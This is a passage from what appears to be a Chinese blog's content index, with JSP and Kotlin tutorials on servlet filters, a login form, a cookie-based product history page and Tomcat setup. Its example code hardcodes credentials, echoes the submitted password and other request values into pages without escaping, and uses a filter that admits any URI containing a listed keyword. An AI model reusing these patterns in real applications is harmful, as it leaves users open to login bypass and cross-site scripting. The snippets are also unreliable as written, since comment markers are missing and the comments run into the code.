\u0026lt;location\u0026gt;/error.jsp\u0026lt;/location\u0026gt; \u0026lt;/error-page\u0026gt; \u0026lt;/web-app\u0026gt; 直接访问 http://localhost:8080/error.jsp，对 f1 过滤器无效（用户直接访问） 直接访问 http://localhost:8080/15742.jsp，对 f1 过滤器有效（异常处理机制，404） MyFilter1 package a import javax.servlet.* import javax.servlet.annotation.WebFilter @WebFilter(urlPatterns = arrayOf(\u0026#34;/error.jsp\u0026#34;), dispatcherTypes = arrayOf(DispatcherType.ERROR)) //通过注解方式配置过滤器 class MyFilter1 : Filter { override fun init(filterConfig: FilterConfig) {} override fun doFilter(p0: ServletRequest, p1: ServletResponse, p2: FilterChain) { println(\u0026#34;发生错误!\u0026#34;) p2.doFilter(p0, p1) 放行 } override fun destroy() {} } error.jsp \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;错误页面\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;错误页面\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 登录页面案例 JSP index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录页面\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录页面\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;form action=\u0026#34;doLogin.jsp\u0026#34; name=\u0026#34;loginForm\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;账号：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;密码：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;reset\u0026#34; value=\u0026#34;重置\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;登录\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; doLogin.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% request.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); String username = request.getParameter(\u0026#34;username\u0026#34;); String password = request.getParameter(\u0026#34;password\u0026#34;); if (\u0026#34;admin\u0026#34;.equals(username) \u0026amp;\u0026amp; \u0026#34;123456\u0026#34;.equals(password)) { session.setAttribute(\u0026#34;username\u0026#34;, username); response.sendRedirect(\u0026#34;login_successful.jsp\u0026#34;); } else { response.sendRedirect(\u0026#34;login_failed.jsp\u0026#34;); } %\u0026gt; login_successful.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录成功\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录成功\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; 欢迎用户：${username} EL 表达式 \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; login_failed.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录失败\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录失败\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;返回登录页面\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; MyFilter class MyFilter : Filter { lateinit var noFilterList: List\u0026lt;String\u0026gt; override fun init(filterConfig: FilterConfig) { noFilterList = filterConfig.getInitParameter(\u0026#34;noFilterList\u0026#34;).split(\u0026#34;;\u0026#34;) 获取放行关键字 } override fun doFilter(request: ServletRequest, response: ServletResponse, chain: FilterChain) { val request1 = request as HttpServletRequest val response1 = response as HttpServletResponse request1.characterEncoding = \u0026#34;UTF-8\u0026#34; 统一指定输入字符集 val uri = request1.requestURI 请求路径 if (request1.session.getAttribute(\u0026#34;username\u0026#34;) != null || uri == \u0026#34;/\u0026#34; || check(uri)) { chain.doFilter(request, response) 放行（通过） } else { response1.sendRedirect(\u0026#34;/\u0026#34;) 不放行（重定向至根目录） } } override fun destroy() { } private fun check(s: String) = noFilterList.find { s.contains(it) } != null 若请求路径包含某个关键字，则返回 true } web.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\u0026#34; version=\u0026#34;3.1\u0026#34;\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;f\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;a.MyFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;noFilterList\u0026lt;/param-name\u0026gt; 放行关键字 \u0026lt;param-value\u0026gt;index.jsp;doLogin.jsp;login_failed.jsp\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;f\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; 匹配所有路径 \u0026lt;/filter-mapping\u0026gt; \u0026lt;/web-app\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/jsp-filter/","summary":"","title":"JSP Filter"},{"content":"Updated on 2017-03-18\nJavaBean 模式\nsrc dao ItemDAO package dao import entity.Item import util.DBHelp object ItemDAO { @JvmStatic fun getAllItems() = mutableListOf\u0026lt;Item\u0026gt;().apply { 从数据库中获取所有商品 DBHelp.connection .prepareStatement(\u0026#34;SELECT * FROM item;\u0026#34;) .executeQuery() .use { while (it.next()) { 遍历 ResultSet 并实例化 Item 实体 val item = Item( id = it.getInt(\u0026#34;id\u0026#34;), name = it.getString(\u0026#34;name\u0026#34;), city = it.getString(\u0026#34;city\u0026#34;), price = it.getInt(\u0026#34;price\u0026#34;), number = it.getInt(\u0026#34;number\u0026#34;), picture = it.getString(\u0026#34;picture\u0026#34;) ) this.add(item) } } } @JvmStatic fun getVisitedItems(s: String) = mutableListOf\u0026lt;Item\u0026gt;().apply { 根据 Cookie 从数据库中获取所有历史游览商品 s .split(\u0026#39;|\u0026#39;) String ➜ List\u0026lt;String\u0026gt; .reversed() 逆转 .map(String::toInt) String ➜ Int .map { getItemById(it) } Int ➜ Item .forEach { this.add(it) } } @JvmStatic fun getItemById(id: Int) = DBHelp.connection 根据 ID 从数据库中获取商品 .prepareStatement(\u0026#34;SELECT * FROM item WHERE id = ?;\u0026#34;).apply { this.setInt(1, id) } .executeQuery() .use { if (it.next()) { ID 存在 val item = Item( id = it.getInt(\u0026#34;id\u0026#34;), name = it.getString(\u0026#34;name\u0026#34;), city = it.getString(\u0026#34;city\u0026#34;), price = it.getInt(\u0026#34;price\u0026#34;), number = it.getInt(\u0026#34;number\u0026#34;), picture = it.getString(\u0026#34;picture\u0026#34;) ) item } else { ID 不存在 val item = Item( id = 0, name = \u0026#34;null\u0026#34;, city = \u0026#34;null\u0026#34;, price = 0, number = 0, picture = \u0026#34;null\u0026#34; ) item } } } entity Item package entity data class Item( 数据类：商品实体 val id: Int, val name: String, val city: String, val price: Int, val number: Int, val picture: String ) util DBHelp package util import java.sql.Connection import java.sql.DriverManager object DBHelp { @JvmStatic val connection: Connection by lazy { 获得数据库连接 Class.forName(\u0026#34;org.postgresql.Driver\u0026#34;) DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) } } CookieHelp package util object CookieHelp { @JvmStatic fun addCookie(cookie: String, id: Int) = cookie 添加 Cookie 并去重 .split(\u0026#39;|\u0026#39;) 分解（String ➜ List） .toMutableList().apply { this.add(id.toString()) } 添加 .distinct() 去重 .fold(\u0026#34;\u0026#34;) { str, s -\u0026gt; if (str == \u0026#34;\u0026#34;) s else str + \u0026#39;|\u0026#39; + s } 合并（List ➜ String） @JvmStatic fun cutCookie(cookie: String) = if (cookie.split(\u0026#39;|\u0026#39;).count() \u0026gt; 5) cookie.substring(cookie.indexOf(\u0026#39;|\u0026#39;) + 1) else cookie 字符串中只保留最近 5 个商品 ID } web index.jsp \u0026lt;%@ page import=\u0026#34;dao.ItemDAO\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;entity.Item\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.List\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;商品列表\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; div { float: left; margin: 10px; } div dd { margin: 0; font-size: 10pt; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;商品列表\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;center\u0026gt; \u0026lt;table width=\u0026#34;700\u0026#34; cellpadding=\u0026#34;0\u0026#34; cellspacing=\u0026#34;0\u0026#34; border=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt; \u0026lt;% final List\u0026lt;Item\u0026gt; list = ItemDAO.getAllItems(); 从数据库中获取所有商品 for (Item item : list) { 开始循环 %\u0026gt; \u0026lt;div\u0026gt; \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt; \u0026lt;a href=\u0026#34;details.jsp?id=\u0026lt;%=item.getId()%\u0026gt;\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/\u0026lt;%=item.getPicture()%\u0026gt;\u0026#34; width=\u0026#34;120\u0026#34; height=\u0026#34;90\u0026#34; border=\u0026#34;1\u0026#34;/\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;\u0026lt;%=item.getName() %\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;产地:\u0026lt;%=item.getCity()%\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;价格:￥ \u0026lt;%=item.getPrice()%\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;% } 结束循环 %\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; details.jsp \u0026lt;%@ page import=\u0026#34;dao.ItemDAO\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;entity.Item\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;util.CookieHelp\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.List\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; 指定输出字符集 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;商品详情\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; div { float: left; margin: 5px 30px; } div dd { margin: 0; font-size: 10pt; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;商品详情\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;% request.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); 指定输入字符集 %\u0026gt; \u0026lt;% final int id = Integer.valueOf(request.getParameter(\u0026#34;id\u0026#34;)); 获得当前页面的商品 ID final Item item = ItemDAO.getItemById(id); 实例化 Item 实体 %\u0026gt; \u0026lt;% boolean hasCookie = false; final Cookie[] cookies = request.getCookies(); for (Cookie c : cookies) { if (c.getName().equals(\u0026#34;visitedItem\u0026#34;)) { 处理商品游览历史 Cookie hasCookie = true; String s1 = CookieHelp.addCookie(c.getValue(), id); 添加商品 ID 并去重 String s2 = CookieHelp.cutCookie(s1); Cookie 只保留最近 5 个商品 ID c.setValue(s2); response.addCookie(c); 添加 Cookie break; } } if (!hasCookie) { Cookie c = new Cookie(\u0026#34;visitedItem\u0026#34;, String.valueOf(id)); 不存在则新建 visitedItem Cookie response.addCookie(c); 添加 Cookie } %\u0026gt; \u0026lt;center\u0026gt; \u0026lt;table width=\u0026#34;700\u0026#34; cellpadding=\u0026#34;0\u0026#34; cellspacing=\u0026#34;0\u0026#34; border=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td width=\u0026#34;70%\u0026#34; valign=\u0026#34;top\u0026#34;\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td rowspan=\u0026#34;4\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/\u0026lt;%=item.getPicture()%\u0026gt;\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;160\u0026#34;/\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;B\u0026gt;\u0026lt;%=item.getName()%\u0026gt; \u0026lt;/B\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;产地：\u0026lt;%=item.getCity()%\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;价格：\u0026lt;%=item.getPrice()%\u0026gt;￥\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td width=\u0026#34;30%\u0026#34; bgcolor=\u0026#34;#EEE\u0026#34; align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;br\u0026gt; \u0026lt;b\u0026gt;您最近浏览的商品\u0026lt;/b\u0026gt;\u0026lt;br\u0026gt; \u0026lt;% for (Cookie c : request.getCookies()) { if (c.getName().equals(\u0026#34;visitedItem\u0026#34;)) { List\u0026lt;Item\u0026gt; list = ItemDAO.getVisitedItems(c.getValue()); 根据 Cookie 从数据库中获取所有历史游览商品 for (Item i : list) { 开始循环 %\u0026gt; \u0026lt;div\u0026gt; \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt; \u0026lt;a href=\u0026#34;details.jsp?id=\u0026lt;%=i.getId()%\u0026gt;\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;images/\u0026lt;%=i.getPicture()%\u0026gt;\u0026#34; width=\u0026#34;120\u0026#34; height=\u0026#34;90\u0026#34; border=\u0026#34;1\u0026#34;/\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;\u0026lt;%=i.getName()%\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;产地:\u0026lt;%=i.getCity()%\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;价格:\u0026lt;%=i.getPrice()%\u0026gt; ￥\u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;% } 结束循环 break; } } %\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; sql CREATE TABLE item ( id SERIAL, name TEXT NOT NULL, city TEXT NOT NULL, price INTEGER NOT NULL, number INTEGER NOT NULL, picture TEXT NOT NULL, PRIMARY KEY (id) ); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;沃特篮球鞋\u0026#39;, \u0026#39;佛山\u0026#39;, \u0026#39;180\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;001.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;安踏运动鞋\u0026#39;, \u0026#39;福州\u0026#39;, \u0026#39;120\u0026#39;, \u0026#39;800\u0026#39;, \u0026#39;002.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;耐克运动鞋\u0026#39;, \u0026#39;广州\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;1000\u0026#39;, \u0026#39;003.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;阿迪达斯T血衫\u0026#39;, \u0026#39;上海\u0026#39;, \u0026#39;388\u0026#39;, \u0026#39;600\u0026#39;, \u0026#39;004.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;李宁文化衫\u0026#39;, \u0026#39;广州\u0026#39;, \u0026#39;180\u0026#39;, \u0026#39;900\u0026#39;, \u0026#39;005.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;小米3\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;1999\u0026#39;, \u0026#39;3000\u0026#39;, \u0026#39;006.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;小米2S\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;1299\u0026#39;, \u0026#39;1000\u0026#39;, \u0026#39;007.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;thinkpad笔记本\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;6999\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;008.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;dell笔记本\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;3999\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;009.jpg\u0026#39;); INSERT INTO item (name, city, price, number, picture) VALUES (\u0026#39;ipad5\u0026#39;, \u0026#39;北京\u0026#39;, \u0026#39;5999\u0026#39;, \u0026#39;500\u0026#39;, \u0026#39;010.jpg\u0026#39;); ","permalink":"https://xhstormr.github.io/blog/posts/jsp-model1/","summary":"","title":"JSP Model1"},{"content":"Updated on 2017-03-09\nhttps://tomcat.apache.org/index.html\nhttps://tomcat.apache.org/tomcat-9.0-doc/api/allclasses-noframe.html\nhttps://tomcat.apache.org/tomcat-9.0-doc/jspapi/allclasses-noframe.html\nhttps://tomcat.apache.org/tomcat-9.0-doc/servletapi/allclasses-noframe.html\nTomcat 环境变量 变量值 变量名 CATALINA_HOME D:\\Download\\apache-tomcat-9.0.0 配置 Tomcat 安装路径 \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; 默认欢迎页 D:\\Download\\apache-tomcat-9.0.0\\conf\\web.xml ⇳ \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;index.html\u0026lt;/welcome-file\u0026gt; \u0026lt;welcome-file\u0026gt;index.htm\u0026lt;/welcome-file\u0026gt; \u0026lt;welcome-file\u0026gt;index.jsp\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; 默认端口号 D:\\Download\\apache-tomcat-9.0.0\\conf\\server.xml ⇳ \u0026lt;Connector port=\u0026#34;8080\u0026#34; protocol=\u0026#34;HTTP/1.1\u0026#34; connectionTimeout=\u0026#34;20000\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; 去掉空白行 全局 ---- D:\\Download\\apache-tomcat-9.0.0\\conf\\web.xml ⇳ \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;trimSpaces\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; 单个页面 ---- \u0026lt;%@ page trimDirectiveWhitespaces=\u0026#34;true\u0026#34; %\u0026gt; IDEA Deployment C:\\Users\\Administrator\\.IntelliJIdea2016.3\\system\\tomcat\\ IDEA Dependence Project Structure -\u0026gt; Modules -\u0026gt; Dependencies -\u0026gt; Add -\u0026gt; Library -\u0026gt; Tomcat JSP 指令 page \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Arrays\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.HashMap\u0026#34; %\u0026gt; include index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; include 指令： \u0026lt;%@ include file=\u0026#34;date.jsp\u0026#34; %\u0026gt; 声明需要包含的页面 include 动作： \u0026lt;jsp:include page=\u0026#34;date.jsp\u0026#34; flush=\u0026#34;false\u0026#34;/\u0026gt; 声明需要包含的页面（flush 是否刷新缓冲区） \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; date.jsp 被包含的页面 ---- \u0026lt;%@ page import=\u0026#34;java.text.SimpleDateFormat\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Date\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% String date = new SimpleDateFormat(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;).format(new Date()); out.print(date); %\u0026gt; include 指令与 include 动作的对比 include 指令 include 动作 静态包含 动态包含 生成内容 文件内容 执行结果 生成 Servlet 合并 独立 编译时间 较慢 较快（不解析资源） 执行时间 较快（不解析资源） 较慢 作用时间 编译期间 请求期间 适用页面 变化较少 经常变化 \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; taglib 注释 客户端可见注释： \u0026lt;!-- HTML 注释 --\u0026gt; 客户端不可见注释： \u0026lt;%-- JSP 注释 --%\u0026gt; \u0026lt;% // Java 单行注释 /* * Java 多行注释 * */ %\u0026gt; 声明 \u0026lt;%! Servlet 中的成员（可声明为 static） private String s = \u0026#34;ABC\u0026#34;; 属性 private int add(int x, int y) { 方法 return x + y; } %\u0026gt; 脚本 \u0026lt;% Servlet 中的 jspService() 的方法代码 System.out.println(\u0026#34;你好\u0026#34;); 输出至控制台 out.println(\u0026#34;你好\u0026#34;); 输出至页面（out 是内置对象，是 JspWriter 的实例化对象） %\u0026gt; 表达式 \u0026lt;%=s%\u0026gt; 调用属性（注意表达式不加分号） \u0026lt;br\u0026gt; \u0026lt;%=add(1, 2)%\u0026gt; 调用方法 ---- 输出： ABC 3 输出九九乘法表 ---- \u0026lt;%! 声明方法 private String a() { DecimalFormat format = new DecimalFormat(\u0026#34;00\u0026#34;); StringBuilder s = new StringBuilder(); for (int i = 1; i \u0026lt;= 9; i++) { for (int j = 1; j \u0026lt;= i; j++) { s.append(i).append(\u0026#39;*\u0026#39;).append(j).append(\u0026#39;=\u0026#39;).append(format.format(i * j)).append(\u0026#34;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026#34;); 空格 } s.append(\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); 换行 } return s.toString(); } %\u0026gt; \u0026lt;%=a()%\u0026gt; 调用方法 生命周期 内置对象 out request index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录页面\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录页面\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;form action=\u0026#34;doLogin.jsp\u0026#34; name=\u0026#34;loginForm\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;账号：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;account\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;密码：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;登录\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; doLogin.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; 指定输出字符集 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录成功\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% request.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); 指定输入字符集 request.setAttribute(\u0026#34;str\u0026#34;, \u0026#34;欢迎!\u0026#34;); %\u0026gt; \u0026lt;h1\u0026gt;登录成功\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; 账号：\u0026lt;%=request.getParameter(\u0026#34;account\u0026#34;)%\u0026gt;\u0026lt;br\u0026gt; 密码：\u0026lt;%=request.getParameter(\u0026#34;password\u0026#34;)%\u0026gt;\u0026lt;br\u0026gt; 属性：\u0026lt;%=request.getAttribute(\u0026#34;str\u0026#34;)%\u0026gt;\u0026lt;br\u0026gt; 协议类型：\u0026lt;%=request.getProtocol()%\u0026gt;\u0026lt;br\u0026gt; 请求类型：\u0026lt;%=request.getContentType()%\u0026gt;\u0026lt;br\u0026gt; 请求大小：\u0026lt;%=request.getContentLength()%\u0026gt; 字节\u0026lt;br\u0026gt; 虚拟路径：\u0026lt;%=request.getContextPath()%\u0026gt;\u0026lt;br\u0026gt; 请求路径：\u0026lt;%=request.getServletPath()%\u0026gt;\u0026lt;br\u0026gt; 真实路径：\u0026lt;%=request.getServletContext().getRealPath(\u0026#34;doLogin.jsp\u0026#34;)%\u0026gt;\u0026lt;br\u0026gt; 主机名称：\u0026lt;%=request.getServerName()%\u0026gt;\u0026lt;br\u0026gt; 主机端口：\u0026lt;%=request.getServerPort()%\u0026gt;\u0026lt;br\u0026gt; 客户端 IP 地址：\u0026lt;%=request.getRemoteAddr()%\u0026gt;\u0026lt;br\u0026gt; 服务端 IP 地址：\u0026lt;%=request.getLocalAddr()%\u0026gt;\u0026lt;br\u0026gt; 